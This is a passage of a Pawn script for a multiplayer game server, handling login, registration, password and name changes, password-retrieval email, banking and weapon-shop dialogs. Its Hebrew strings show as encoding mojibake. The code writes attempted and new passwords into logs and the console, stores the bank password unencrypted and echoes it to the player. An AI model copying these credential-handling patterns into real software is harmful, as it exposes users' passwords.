					format(string,sizeof(string),"(%s) Failed Login (%d)%s [%s / real user last ip: %s / from dialog]",GetIP(playerid),playerid,GetName(playerid),inputtext,fexist(string) ? (fgetstring(string,"LastConnectIP")) : ("file not exists"));
					Log("Attention",playerid,string);
					playerinfo[playerid][faileds][0]++;
					if(playerinfo[playerid][faileds][0] >= 4)
					{
						SendClientMessage(playerid,red," .Єс°· р· юёЇ° ЁщёщхЁх· фф·чс°х· фюх·° хьъ Ёх·ў· юф∙°·");
						SendClientMessage(playerid,red,webpage " :рэ ∙ыч· р· ёщёю·ъ, ЇЁф рьщЁх ср·°");
						ShowPlayerDialog(playerid,dialog_wrongpass,DIALOG_STYLE_MSGBOX,@c(lightblue) "ф·чс°х· ью∙·ю∙",@c(red) ".Ёы∙ь· щх·° юущ ЇЄющэ сфўьу· фёщёюр\n" webpage " :сющуф х∙ыч· р· ёщёю·ъ, р·ф юхцюя ьсў∙ юрщ·Ёх ёщёюр чу∙ф сЇх°хэ ∙ьЁх","щЎщрф","");
						return SetKick(playerid,INVALID_PLAYER_ID,"ф·чс°хщх· Ёы∙ьх");
					}
					else
					{
						if((3-playerinfo[playerid][faileds][0]) == 1) format(string,sizeof(string),@c(red) " .фёщёюф ∙фўьу· ∙тхщф, Ёх·° ьъ Єху Ёщёщхя рчу");
						else format(string,sizeof(string),@c(red) " .фёщёюф ∙фўьу· ∙тхщф, Ёх·°х ьъ Єху %d ЁщёщхЁх·",3-playerinfo[playerid][faileds][0]);
						SendClientMessage(playerid,red,string);
						ShowPlayerDialog(playerid,dialog_wrongpass,DIALOG_STYLE_MSGBOX,@c(lightblue) "ф·чс°х· ью∙·ю∙",string,"Ёёф ∙хс","");
					}
				}
			}
			else
			{
				playerinfo[playerid][logindia] = playerinfo[playerid][logindia] == DIALOG_STYLE_PASSWORD ? DIALOG_STYLE_INPUT : DIALOG_STYLE_PASSWORD;
				ShowPlayerConstDialog(playerid,dialog_login);
			}
		}
		case dialog_register:
		{
			if(response)
			{
				if(strlen(inputtext) < 3) return ShowPlayerDialog(playerid,dialog_badregister,DIALOG_STYLE_MSGBOX,@c(lightblue) "ф°∙юф ь∙°·"," .фёщёюр фцх ўЎ°ф юущ","Ёёф ∙хс","сщшхь");
				if(strlen(inputtext) > 15) return ShowPlayerDialog(playerid,dialog_badregister,DIALOG_STYLE_MSGBOX,@c(lightblue) "ф°∙юф ь∙°·"," .фёщёюр фцх р°хыф юущ","Ёёф ∙хс","сщшхь");
				playerinfo[playerid][logged] = 1, playerinfo[playerid][level] = !playerinfo[playerid][level]? 1:playerinfo[playerid][level];
				SendClientMessage(playerid,grey," ...рЁр фю·я");
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "ф°∙юф ь∙°·",@c(grey) "...рЁр фю·я","OK","");
				RegisterPlayer(playerid,Encrypt(inputtext));
				format(string,sizeof(string),@c(green) "!Ё°∙ю· сфЎьчф ь∙°· ∙ьЁх\n\n" @c(white) "%s" @c(lightgreen) " :∙э ю∙·ю∙\n" @c(white) "%s" @c(lightgreen) " :ёщёюр\n\n" @c(yellow) "* /Help :ьыь Єц°ф ∙р·ф Ў°щъ ф∙·ю∙ сЇўхуф\n" @c(orange) "* /United :ыь фющуЄ Єь фўфщьф сЇўхуф рч·\n* /Profile :ьЄ°щы· фЇ°хЇщь ∙ьъ ф∙·ю∙ сЇўхуф\n* /Tutorial (/T) :ьюу°щыщэ Єь ф∙°·",GetName(playerid),inputtext);
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,"ф°∙юф ь∙°·",string,"OK","");
				SendClientMessage(playerid,lightblue," :Ё°∙ю· сфЎьчф ь∙°· ∙ьЁх, фЇ°шщэ ∙ьъ");
				format(string,sizeof(string)," %s " @c(lightgreen) ":∙э ю∙·ю∙",GetName(playerid));
				SendClientMessage(playerid,white,string);
				format(string,sizeof(string)," %s " @c(lightgreen) ":ёщёюр",inputtext);
				SendClientMessage(playerid,white,string);
				SendClientMessage(playerid,orange," Х :с·х° ф·чьф юхюьї ьф∙·ю∙ сЇўхух· фрьх");
				SendClientMessage(playerid,lightyellow," * /help :ьыь Єц°ф ∙р·ф Ў°щъ ф∙·ю∙ сЇўхуф");
				SendClientMessage(playerid,yellow," * /united :ыь фющуЄ Єь фўфщьф сЇўхуф рч·");
				SendClientMessage(playerid,yellow," * /profile :ьЄ°щы· фЇ°хЇщь ∙ьъ, ыхьь ∙э Ї°шщ хЄху");
				SendClientMessage(playerid,yellow," * /tutorial :ьюу°щыщэ Єь ф∙°·");
				PlaySound(playerid,1057);
				ShowPlayerConstDialog(playerid,dialog_secretword,1);
			}
			else
			{
				// guest message
			}
		}
		case dialog_wrongpass: ShowPlayerConstDialog(playerid,dialog_login);
		case dialog_badregister: if(response) ShowPlayerConstDialog(playerid,dialog_register);
		case dialog_ni: return 1;
		case dialog_changepass:
		{
			if(response)
			{
				if(strlen(inputtext) < 3) return ShowPlayerDialog(playerid,dialog_wrongchangepass,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ёщёюр",@c(red) " .фёщёюр фцх ўЎ°ф юущ","Ёёф ∙хс","сщшхь");
				if(strlen(inputtext) > 15) return ShowPlayerDialog(playerid,dialog_wrongchangepass,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ёщёюр",@c(red) " .фёщёюр фцх р°хыф юущ","Ёёф ∙хс","сщшхь");
				if(!equal(fgetstring(fuser(playerid),"LastChangepass"),GetDateAsString())) fsetint(fuser(playerid),"ChangepassLimit",0);
				if(fgetint(fuser(playerid),"ChangepassLimit") >= 3) return ShowPlayerDialog(playerid,dialog_wrongchangepass,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ёщёюр",@c(red) " .∙щэ ьс: р·ф щыхь ьф∙·ю∙ сЇўхуф фцх °ў 3 ЇЄющэ сщхэ","Ёёф ∙хс","сщшхь");
				format(string,sizeof(string),@c(green) "!ёщёю·ъ ∙хЁ·ф сфЎьчф\n" @c(yellow) "%s :∙э ю∙·ю∙\n%s :ёщёюр чу∙ф",GetName(playerid),inputtext);
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ёщёюр",string,"OK","");
				SendClientMessage(playerid,lightblue," ~~~ :∙щЁхщ фёщёюр - ющуЄ ~~~");
				format(string,sizeof(string)," .ёщёю·ъ фхчьЇф. цхфщ фЇЄэ ф %d ∙∙щЁщ· ёщёюр фщхэ",fgetint(fuser(playerid),"ChangepassLimit")+1);
				SendClientMessage(playerid,yellow,string);
				SendClientMessage(playerid,yellow," .р· ёщёю·ъ ·хыь ь∙Ёх· 3 ЇЄющэ сыь щхэ");
				format(string,sizeof(string)," Х %s :∙э ю∙·ю∙",GetName(playerid));
				SendClientMessage(playerid,orange,string);
				format(string,sizeof(string)," Х %s :ёщёю·ъ фчу∙ф",inputtext);
				SendClientMessage(playerid,orange,string);
				SendClientMessage(playerid,yellow," * .рщя ьъ юф ьурхт ьтсщ ЎЇщщф сёщёюр юЎу ффЁфьф - ёщёю·ъ ф°∙хюф с°∙щюх· ∙ьЁх юхЎЇЁ· хьыя рє рчу ьр щыхь ь°рх·ф");
				SendClientMessage(playerid,red," * .∙щэ ьс: рЁх ююьщЎщэ ьЎьэ чьў цф ∙ь фЎ'рш, ьюў°ф ∙·∙ыч р· ёщёю·ъ. Ўхх· ффЁфьф рщЁх рч°рщ Єь ∙ыщч· ёщёюрх·");
				printf(" --- [%s] %s change his password to %s",GetDateAsString(),GetName(playerid),inputtext);
				fsetstring(fuser(playerid),"Password",Encrypt(inputtext));
				PlaySound(playerid,1057);
				fsetstring(fuser(playerid),"LastChangepass",GetDateAsString());
				fsetint(fuser(playerid),"ChangepassLimit",fgetint(fuser(playerid),"ChangepassLimit")+1);
			}
			else SendClientMessage(playerid,red," .сщшь· р· ∙щЁхщ фёщёюр");
		}
		case dialog_rpassword: if(response)
		{
			if(!strlen(inputtext) || strlen(inputtext) > MAX_PLAYER_NAME) return ShowPlayerDialog(playerid,dialog_rpassword,DIALOG_STYLE_INPUT,@c(lightblue) "∙чцх° ёщёюр у°ъ фющщь",@c(red) ":рх°ъ фыщЁхщ ∙°∙ю· рщЁх фтщхЁщ, Ёёф ∙хс","∙чцх° ёщёюр","сщшхь");
			if(!IsValidNick(inputtext)) return ShowPlayerDialog(playerid,dialog_rpassword,DIALOG_STYLE_INPUT,@c(lightblue) "∙чцх° ёщёюр у°ъ фющщь",@c(red) ":фыщЁхщ ∙°∙ю· юыщь ·хщэ ьр чхўщщэ. Ёёф ∙хс","∙чцх° ёщёюр","сщшхь");
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && equal(GetName(i),inputtext))
			{
				format(string,sizeof(string),@c(red) " :ю∙·ю∙ цф ючхс° ь∙°· срщщущ %d хьыя ьр Ёщ·я ь∙чц° Єсх°х р· фёщёюр. Ёёф ю∙·ю∙ рч°",i);
				return ShowPlayerDialog(playerid,dialog_rpassword,DIALOG_STYLE_INPUT,@c(lightblue) "∙чцх° ёщёюр у°ъ фющщь",string,"∙чцх° ёщёюр","сщшхь");
			}
			format(string,sizeof(string),"/DM/Users/%s.ini",inputtext);
			if(!fexist(string)) return ShowPlayerDialog(playerid,dialog_rpassword,DIALOG_STYLE_INPUT,@c(lightblue) "∙чцх° ёщёюр у°ъ фющщь",@c(red) ":фыщЁхщ ∙°∙ю· рщЁх ўщщэ. Ёёф ∙хс","∙чцх° ёщёюр","сщшхь");
			if(PropertyExists_STR(inputtext)) return ShowPlayerDialog(playerid,dialog_rpassword,DIALOG_STYLE_INPUT,@c(lightblue) "∙чцх° ёщёюр у°ъ фющщь",@c(red) ":ыс° Ё∙ьч ўху ∙чцх° ёщёюр ьющщь ∙ь ю∙·ю∙ цф. Ёёф ю∙·ю∙ рч°","∙чцх° ёщёюр","сщшхь");
			format(string,sizeof(string),fgetstring(string,"ProfileEmail"));
			if(equal(string,"None") || equal(string,"No") || !strlen(string)) return ShowPlayerDialog(playerid,dialog_rpassword,DIALOG_STYLE_INPUT,@c(lightblue) "∙чцх° ёщёюр у°ъ фющщь",@c(red) ":ью∙·ю∙ цф рщя рщющщь юхту° сЇ°хЇщь. Ёёф ю∙·ю∙ рч°","∙чцх° ёщёюр","сщшхь");
			rpasswordUsed = 30;
			new code_[32];
			format(code_,sizeof(code_),GenerateRandomString(12,true,false,true,false));
			format(string,sizeof(string),"c.sa-mp.co.il/dm/retrpass.php?mail=%s&code=%s&name=%s",string,code_,inputtext);
			SetProperty_STR(inputtext,code_);
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙чцх° ёщёюр у°ъ фющщь",HTTP(playerid,HTTP_GET,string,"","RetrievePasswordMail") ? (@c(green) "...фхуЄф ьющщь Єэ фЇ°шщэ ·хЄс° ·хъ юёЇ° ∙Ёщх·") : (@c(red) ".ьр Ёщ·я ь∙ьхч р· фющщь ы°тЄ"),"OK","");
		}
		case dialog_changename:
		{
			if(response)
			{
				if(fkeyexist(file_nbans,inputtext)) return ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ∙э ю∙·ю∙",@c(red) " .фыщЁхщ фцф ссря","Ёёф ∙хс","сщшхь");
				if(!equal(fgetstring(fuser(playerid),"LastChangename"),GetDateAsString())) fsetint(fuser(playerid),"ChangenameLimit",0);
				if(fgetint(fuser(playerid),"ChangenameLimit") >= 3) return ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ∙э ю∙·ю∙",@c(red) " .∙щэ ьс: р·ф щыхь ьф∙·ю∙ сЇўхуф фцх °ў 3 ЇЄющэ сщхэ\n/BChangeName :°хЎф ь∙Ёх· ыщЁхщ ∙хс? ф∙·ю∙ с","Try Again","Cancel");
				for(new i=0;i<MAX_PLAYERS_;i++)
				{
					if(IsPlayerConnected(i) && equal(GetName(i),inputtext))
					{
						format(string,sizeof(string),@c(red) " .%03d ∙э фю∙·ю∙ фцф ыс° Ёьўч Єь щущ рщщущ",i);
						ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ∙э ю∙·ю∙",string,"Ёёф ∙хс","сщшхь");
						return 1;
					}
				}
				if(equal(inputtext,"None") || equal(inputtext,botname)) return ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ∙э ю∙·ю∙",@c(red) " .юЎшЄ°щэ, ръ ьр Ёщ·я ь∙Ёх· р· ∙э фю∙·ю∙ ьшўёш цф","Ёёф ∙хс","сщшхь");
				new f[M_S], lastname[MAX_PLAYER_NAME];
				format(f,sizeof(f),"/DM/Users/%s.ini",inputtext);
				if(fexist(f)) return ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ∙э ю∙·ю∙",@c(red) " .∙э фю∙·ю∙ фцф ыс° Ёьўч Є\"щ ∙чўя ьр ючхс°","Ёёф ∙хс","сщшхь");
				if(strlen(inputtext) > 20) return ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ∙э ю∙·ю∙",@c(red) " .фыщЁхщ фцф р°хъ юущ","Ёёф ∙хс","сщшхь");
				if(strlen(inputtext) < 3) return ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ∙э ю∙·ю∙",@c(red) " .фыщЁхщ фцф ўЎ° юущ","Ёёф ∙хс","сщшхь");
				if(!IsValidNick(inputtext)) return ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ∙э ю∙·ю∙",@c(red) " .∙э ю∙·ю∙ ьр щыхь ьфыщь чьў юф·хщэ ∙ы·с·","Ёёф ∙хс","сщшхь");
				format(lastname,sizeof(lastname),GetName(playerid));
				ChangeName(playerid,inputtext);
				format(string,sizeof(string),@c(green) "!∙э фю∙·ю∙ ∙хЁф сфЎьчф\n" @c(yellow) "%s :∙э ю∙·ю∙ чу∙\n%s :∙э ю∙·ю∙ ўхуэ",inputtext,lastname);
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ ∙э ю∙·ю∙",string,"OK","");
				SendClientMessage(playerid,lightblue," ~~~ :∙щЁхщ ыщЁхщ - ющуЄ ~~~");
				format(string,sizeof(string)," .ыщЁхщщъ фхчьє. цхфщ фЇЄэ ф %d ∙∙щЁщ· ыщЁхщ фщхэ",fgetint(fuser(playerid),"ChangenameLimit")+1);
				SendClientMessage(playerid,yellow,string);
				SendClientMessage(playerid,yellow," .р· ыщЁхщщъ ·хыь ь∙Ёх· 3 ЇЄющэ сыь щхэ");
				format(string,sizeof(string)," Х %s :ыщЁхщ ўхуэ",lastname);
				SendClientMessage(playerid,orange,string);
				format(string,sizeof(string)," Х %s :ыщЁхщ чу∙",inputtext);
				SendClientMessage(playerid,orange,string);
				SendClientMessage(playerid,yellow," * .сющуф х∙щЁщ· р· ыщЁхщщъ 3 ЇЄющэ фщхэ хр·ф сыь цр· °хЎф ь∙Ёх·х - ·хыь ь∙ьхч ющщь рь фЁфь· ф∙°· хфЄЁщщя щшхЇь");
				SendClientMessage(playerid,red," * .∙щэ ьс: рЁх ююьщЎщэ ьЎьэ чьў цф ∙ь фЎ'рш, ьюў°ф ∙·∙ыч р· ыщЁхщщъ. Ўхх· ффЁфьф рщЁх рч°рщ Єь ∙ыщч· ыщЁхщщэ");
				printf(" --- [%s] %s change his nick to %s",GetDateAsString(),GetName(playerid),inputtext);
				PlaySound(playerid,1057);
				format(string,sizeof(string),"oldname: %s, newname: %s",lastname,inputtext);
				Log("ChangeName",playerid,string);
				fsetstring(fuser(playerid),"LastChangename",GetDateAsString());
				fsetint(fuser(playerid),"ChangenameLimit",fgetint(fuser(playerid),"ChangenameLimit")+1);
			}
			else SendClientMessage(playerid,red," .сщшь· р· ∙щЁхщ фыщЁхщ");
		}
		case dialog_wrongchangepass: if(response) ShowPlayerDialog(playerid,dialog_changepass,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ ёщёюр",@c(green) ":сч° ёщёюр чу∙ф х°∙хэ рх·ф ыря","∙Ёф ёщёюр","сщшхь");
		case dialog_wrongchangename: if(response) ShowPlayerDialog(playerid,dialog_changename,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ ∙э ю∙·ю∙",@c(green) ":сч° ∙э ю∙·ю∙ чу∙ х°∙хэ рх·х ыря","∙Ёф ∙э ю∙·ю∙","сщшхь");
		case dialog_tm:
		{
			if(response)
			{
				if(playerinfo[playerid][tinfo])
				{
					playerinfo[playerid][tinfo] = 0;
					format(string,sizeof(string)," ~~~ :%s Ї°шщ ф∙щтх° ~~~",Teleports[listitem][Tcmd]);
					SendClientMessage(playerid,lightblue,string);
					format(string,sizeof(string)," Х %02d :юёЇ° ёщух°щ",listitem);
					SendClientMessage(playerid,grey,string);
					if(!strlen(Teleports[listitem][Tauthor])) SendClientMessage(playerid,grey," Х ЁхЎ° Є\"щ Ўхх· фЁфь· ф∙°·");
					else
					{
						format(string,sizeof(string)," Х %s ЁхЎ° Є\"щ",Teleports[listitem][Tauthor]);
						SendClientMessage(playerid,grey,string);
					}
					format(string,sizeof(string)," Х с∙щтх° цф %s ь·ўхє",Teleports[listitem][Tnoshooting] ? ("рёх°") : ("юх·°"));
					SendClientMessage(playerid,grey,string);
					format(string,sizeof(string)," Х ∙щтх° цф ю∙т° %s °ыс",Teleports[listitem][Twithv] ? ("Єэ") : ("сьщ"));
					SendClientMessage(playerid,grey,string);
					format(string,sizeof(string)," Х %d ∙щтх° цф ўщщэ сЄхьэ юёЇ°",Teleports[listitem][Tw]);
					SendClientMessage(playerid,grey,string);
				}
				else Teleport(playerid,listitem);
			}
			else if(playerinfo[playerid][tinfo]) command(playerid,"/tele");
		}
		case dialog_tlist:
		{
			if(response)
			{
				if(listitem == sizeof(TeleportCategories)) ShowPlayerConstDialog(playerid,dialog_tm);
				else
				{
					if(listitem == sizeof(TeleportCategories)-1 && !playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .ь∙щтх° ьўштх°щщф цх VIP Єьщъ ьфщх·");
					new Float:h, dia[M_S_D];
					GetPlayerHealth(playerid,h);
					if(h < min_tele_health)
					{
						format(string,sizeof(string)," .ьр Ёщ·я ьф∙·т° Єэ %.0f %% чщщэ рх Їчх·",min_tele_health);
						return SendClientMessage(playerid,red,string);
					}
					playerinfo[playerid][clickon] = listitem;
					for(new i = 0; i < sizeof(Teleports); i++) if(Teleports[i][Tcategory] == listitem) format(dia,sizeof(dia),"%s%s" @c(yellow) "%s" @c(grey) " - %s",dia,!strlen(dia) ? ("") : ("\n"),Teleports[i][Tcmd],Teleports[i][Ttext]);
					format(string,sizeof(string),@c(lightblue) "∙щтх°щэ: %s",TeleportCategories[listitem]);
					ShowPlayerDialog(playerid,dialog_tcategory,DIALOG_STYLE_LIST,string,dia,"∙щтх°","чцх°");
				}
			}
		}
		case dialog_tcategory:
		{
			if(response)
			{
				new c = 0;
				for(new i = 0; i < sizeof(Teleports); i++) if(Teleports[i][Tcategory] == playerinfo[playerid][clickon])
				{
					if(c == listitem)
					{
						Teleport(playerid,i);
						break;
					}
					c++;
				}
			}
			else command(playerid,"/tm");
		}
		case dialog_wrongtp: if(response) command(playerid,"/tm");
		case dialog_level: if(response)
		{
			format(string,sizeof(string)," !Єьф ь°юф %d " @c(lightred) "%s" @c(lightyellow) " - юць шхс",playerinfo[playerid][level],GetName(playerid));
			SendClientMessageToAll(lightyellow,string);
		}
		case dialog_bank: if(response)
		{
			new isclan;
			switch(listitem)
			{
				case 2: return command(playerid,"/deposit");
				case 3: return command(playerid,"/withdraw");
				case 4: command(playerid,"/depositall");
				case 5: command(playerid,"/withdrawall");
				case 6:
				{
					if(playerinfo[playerid][ccard]) return ShowPlayerDialog(playerid,dialog_ccard,DIALOG_STYLE_MSGBOX,@c(lightblue) "ы°шщё р∙°рщ",@c(grey) ":щ∙ ьъ ы°шщё р∙°рщ\n.фхр юрЇ∙° ьъ ьўЁх· ус°щэ с∙°· щ∙щ°х· юфыёє ∙сч∙схя фсЁў ∙ьъ\n\n.р·ф щыхь ьючхў рх·х, хьўсь Єьщх " @c(green) "50000$","ючщўф","сщшхь");
					else return ShowPlayerDialog(playerid,dialog_ccard,DIALOG_STYLE_MSGBOX,@c(lightblue) "ы°шщё р∙°рщ",@c(grey) ":с∙°· ∙ьЁх Ёщ·я ьўЁх· ы°шщё р∙°рщ\n,фы°шщё юрЇ∙° ўЁщщф ∙ь ус°щэ с∙°· щ∙щ°х· Єэ фыёє ∙ь ч∙схя фсЁў ∙ьъ\n.хсЁхёє, юрЇ∙° ьфхЎщр ыёє юфыёЇхюшщэ фюЇхц°щэ с°чхсх·\n\n.·хыь ьўЁх· ы°шщё р∙°рщ сючщ° " @c(green) "200000$","ўЁщщф","сщшхь");
				}
				case 7:
				{
					if(playerinfo[playerid][logged]) return ShowPlayerConstDialog(playerid,dialog_banksetting);
					else SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ыущ ьЄ°хъ р· фту°х· фсЁў");
				}
				case 8: if(playerinfo[playerid][clan]) isclan = 1, ShowPlayerConstDialog(playerid,dialog_cbank);
			}
			if(!isclan) ShowPlayerConstDialog(playerid,dialog_bank);
		}
		case dialog_cbank:
		{
		    if(!response) return ShowPlayerConstDialog(playerid,dialog_bank);
			switch(listitem)
			{
			    case 2: return ShowPlayerConstDialog(playerid,dialog_cbank_deposit);
			    case 3: return ShowPlayerConstDialog(playerid,dialog_cbank_withdraw);
				case 4: command(playerid,"/cdepositall");
				case 5: command(playerid,"/cwithdrawall");
			}
		    ShowPlayerConstDialog(playerid,dialog_cbank);
		}
		case dialog_cbank_deposit, dialog_cbank_withdraw:
		{
		    if(!response) return ShowPlayerConstDialog(playerid, dialog_cbank);
		    new thecmd[30];
			if(strlen(inputtext) > 29 || !IsNumeric(inputtext)) return SendClientMessage(playerid, red, " .ёыхэ ∙тхщ"), ShowPlayerConstDialog(playerid, dialogid);
			new val = strval(inputtext);
			if(val < 1 || val > 99999999) return SendClientMessage(playerid, red, " .ёыхэ ∙тхщ"), ShowPlayerConstDialog(playerid, dialogid);
			format(thecmd, 30, "%s %s", (dialogid == dialog_cbank_deposit) ? ("/cdeposit") : ("/cwithdraw"), inputtext);
			command(playerid, thecmd);
			ShowPlayerConstDialog(playerid, dialogid);
		}
		case dialog_ccard:
		{
			if(response) command(playerid,playerinfo[playerid][ccard] ? ("/sellcc") : ("/buycc"));
			ShowPlayerConstDialog(playerid,dialog_bank);
		}
		case dialog_banksetting:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0:
					{
						playerinfo[playerid][bankshare] = !playerinfo[playerid][bankshare];
						fsetint(fuser(playerid),"BankShare",playerinfo[playerid][bankshare]);
						PlaySound(playerid,1057);
						if(playerinfo[playerid][bankshare]) SendClientMessage(playerid,green," .юЄы∙щх, ∙чўЁщэ ∙щ∙ ьфэ р· фёщёюр ьч∙схя фсЁў ∙ьъ щхыьх ьф∙·ю∙ сх");
						else SendClientMessage(playerid,red," .юЄы∙щх, рє рчу (тэ ∙чўЁщэ ∙щ∙ ьфэ р· фёщёюр ьч∙схя фсЁў ∙ьъ) ьр щхыь ьф∙·ю∙ сч∙схя фсЁў чхї ююъ");
						ShowPlayerConstDialog(playerid,dialog_banksetting);
					}
					case 1: ShowPlayerDialog(playerid,dialog_bankpass,DIALOG_STYLE_PASSWORD,@c(lightblue) "Є°щы· ёщёю· ч∙схя фсЁў",@c(grey) ":°∙хэ ыря р· фёщёюр фчу∙ф ьч∙схя фсЁў ∙ьъ","рщ∙х°","сщшхь");
				}
			}
			else ShowPlayerConstDialog(playerid,dialog_bank);
		}
		case dialog_bankpass:
		{
			if(response)
			{
				if(strlen(inputtext) < 2) SendClientMessage(playerid,red," .рх°ъ фёщёюр ўЎ° юущ");
				else if(strlen(inputtext) > 10) SendClientMessage(playerid,red," .рх°ъ фёщёюр р°хъ юущ");
				else
				{
					fsetstring(fuser(playerid),"BankPassword",inputtext);
					SendClientMessage(playerid,green," :ёщёю· ч∙схя фсЁў ЁЄ°ыф сфЎьчф ьёщёюр фсрф");
					SendClientMessage(playerid,white,inputtext);
					PlaySound(playerid,1057);
				}
			}
			ShowPlayerConstDialog(playerid,dialog_banksetting);
		}
		case dialog_deposit:
		{
			if(response)
			{
				format(string,sizeof(string),"/deposit %s",inputtext);
				command(playerid,string);
			}
			ShowPlayerConstDialog(playerid,dialog_bank);
		}
		case dialog_withdraw:
		{
			if(response)
			{
				format(string,sizeof(string),"/withdraw %s",inputtext);
				command(playerid,string);
			}
			ShowPlayerConstDialog(playerid,dialog_bank);
		}
		case dialog_ammu:
		{
			if(response) switch(listitem)
			{
				case 0:
				{
					playerinfo[playerid][clickon] = 1;
					ShowPlayerConstDialog(playerid,dialog_bw);
				}
				case 1:
				{
					playerinfo[playerid][clickon] = 2;
					ShowPlayerConstDialog(playerid,dialog_bw);
				}
				case 2: ShowPlayerConstDialog(playerid,dialog_addons);
				case 3: ShowPlayerConstDialog(playerid,dialog_spw);
				case 4:
				{
					if(ammusale[0] > ammusale_none)
					{
						format(string,sizeof(string),@c(green) "$ :фюсЎЄ счЁх· фЁ∙ўщэ $\n" @c(lightgreen) "%s",AmmunationSaleName());
						ShowPlayerDialog(playerid,dialog_ammusale,DIALOG_STYLE_MSGBOX,@c(lightblue) "чЁх· фЁ∙ўщэ - Ї°шщ фюсЎЄ",string,"чцх°","");
					}
					else ShowPlayerConstDialog(playerid,dialog_ammusale);
				}
				case 5: command(playerid,"/resetw");
			}
		}
		case dialog_bw:
		{
			if(response)
			{
				if(playerinfo[playerid][level] < Ammunation[listitem][aLevel])
				{
					format(string,sizeof(string),@c(red) " .сыущ ьўЁх· р· фЁ∙ў фцф Єьщъ ьфщх· ьЇчх· с°юф %d",Ammunation[listitem][aLevel]);
					return ShowPlayerDialog(playerid,dialog_bwwrong,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· Ё∙ўщэ",string,"Ёёф ∙хс","сщшхь");
				}
				if(playerinfo[playerid][clickon] == 1)
				{
					if(GetMoney(playerid) < WeaponCost(playerid,listitem)) return ShowPlayerDialog(playerid,dialog_bwwrong,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· Ё∙ўщэ",@c(red) " .рщя ьъ юёЇщў ыёє ьўЁщщ· фЁ∙ў фцф","Ёёф ∙хс","сщшхь");
					format(string,sizeof(string),"/bw %d",listitem + 1);
				}
				else
				{
					if(!playerinfo[playerid][ccard]) return ShowPlayerDialog(playerid,dialog_bwwrong,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· Ё∙ўщэ",@c(red) " .рщя ьъ ы°шщё р∙°рщ","чцх°","сщшхь");
					if(playerinfo[playerid][bank] < WeaponCost(playerid,listitem)) return ShowPlayerDialog(playerid,dialog_bwwrong,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· Ё∙ўщэ",@c(red) " .рщя ьъ юёЇщў ыёє ьўЁщщ· фЁ∙ў фцф","чцх°","сщшхь");
					format(string,sizeof(string),"/ccbw %d",listitem + 1);
				}
				command(playerid,string);
				ShowPlayerConstDialog(playerid,dialog_bw);
			}
			else ShowPlayerConstDialog(playerid,dialog_ammu);
		}
		case dialog_bwwrong: if(response) ShowPlayerConstDialog(playerid,dialog_bw);
		case dialog_ammusale:
		{
			if(response && ammusale[0] == ammusale_none)
			{
				if(GetPlayerCheckpoint(playerid) != cp_ammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· фЁ∙ўщэ сыущ ьсЎЄ Їўхуф цх");
				if(playerinfo[playerid][level] < AmmunationSales[listitem][asLevel])
				{
					format(string,sizeof(string),@c(red) ".сыущ ьўЁх· р· фчсщьф фцх Єьщъ ьфщх· ьЇчх· с°юф %d",AmmunationSales[listitem][asLevel]);
					return ShowPlayerDialog(playerid,dialog_ammusaleerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· юсЎЄщэ",string,"чцх°","");
				}
                new cost = AmmunationSales[listitem][asCost];
				for(new i = 0; i < 3; i++) if(AmmunationSales[listitem][asWeapons][i] != -1) cost += WeaponCost(playerid, AmmunationSales[listitem][asWeapons][i]);
				if(GetMoney(playerid) < cost) return ShowPlayerDialog(playerid,dialog_ammusaleerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· юсЎЄщэ",@c(red) ".рщя ьъ юёЇщў ыёє ьўЁщщ· фчсщьф фцх","чцх°","");
				GiveMoney(playerid,0-cost);
				for(new i = 0, wid = -1; i < 3; i++) if(AmmunationSales[listitem][asWeapons][i] != -1)
				{
					wid = AmmunationSales[listitem][asWeapons][i];
					GiveWeapon(playerid,Ammunation[wid][aID],Ammunation[wid][aAmmo]);
					playerinfo[playerid][weapons][wid] = Ammunation[wid][aID];
					if(playerinfo[playerid][weapons][Ammunation[wid][aSlot]] != Ammunation[wid][aID] && playerinfo[playerid][weapons][Ammunation[wid][aSlot]] != 0) playerinfo[playerid][ammo][Ammunation[wid][aSlot]] = 0;
					if(Ammunation[wid][aSlot] < 8) playerinfo[playerid][ammo][Ammunation[wid][aSlot]]++;
					if(playerinfo[playerid][logged])
					{
